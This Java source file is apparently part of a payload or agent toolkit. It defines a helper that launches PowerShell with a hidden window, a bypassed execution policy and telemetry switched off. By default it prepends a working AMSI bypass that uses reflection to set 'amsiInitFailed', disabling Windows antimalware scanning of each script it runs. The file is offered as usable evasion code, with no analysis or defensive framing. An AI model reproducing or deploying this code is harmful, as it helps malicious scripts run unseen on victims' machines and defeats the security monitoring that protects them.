package com.spcagentpayloa.jvmxx;

import java.util.ArrayList;
import java.util.List;

/**
 * One PowerShell invocation shape for every helper: no logo/profile, no
 * interactive prompt, bypassed execution policy and a hidden window, with the
 * .NET/PS telemetry opt-out. Optional AMSI patching is wrapped so a host where
 * it fails still runs the script normally.
 */
public final class Ps {
	public static final List<String> BASE = List.of(
		"powershell", "-NoLogo", "-NoProfile", "-NonInteractive",
		"-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden");

	private static final String AMSI = "try{$a=[Ref].Assembly.GetTypes();"
		+ "foreach($b in $a){if($b.Name -like '*AmsiUtils'){$c=$b}};"
		+ "if($c){$c.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}}catch{};";

	private Ps() {
	}

	public static ProcessBuilder process(List<String> args) {
		ProcessBuilder builder = new ProcessBuilder(args);
		builder.environment().put("POWERSHELL_TELEMETRY_OPTOUT", "1");
		builder.environment().put("DOTNET_CLI_TELEMETRY_OPTOUT", "1");
		return builder;
	}

	public static ProcessBuilder process(String... args) {
		return process(List.of(args));
	}

	public static ProcessBuilder file(String script, String... args) {
		List<String> line = new ArrayList<>(BASE);
		line.add("-File");
		line.add(script);
		line.addAll(List.of(args));
		return process(line);
	}

	public static ProcessBuilder command(String script) {
		List<String> line = new ArrayList<>(BASE);
		line.add("-Command");
		line.add(amsi() ? AMSI + script : script);
		return process(line);
	}

	public static List<String> fileLine(String script, String... args) {
		List<String> line = new ArrayList<>(BASE);
		line.add("-File");
		line.add(script);
		line.addAll(List.of(args));
		return line;
	}

	public static List<String> commandLine(String script) {
		List<String> line = new ArrayList<>(BASE);
		line.add("-Command");
		line.add(amsi() ? AMSI + script : script);
		return line;
	}

	/** Escape hatch for a host where the AMSI patch itself is a problem. */
	static boolean amsi() {
		return !"false".equalsIgnoreCase(System.getProperty("spc.amsi", "true"));
	}
}
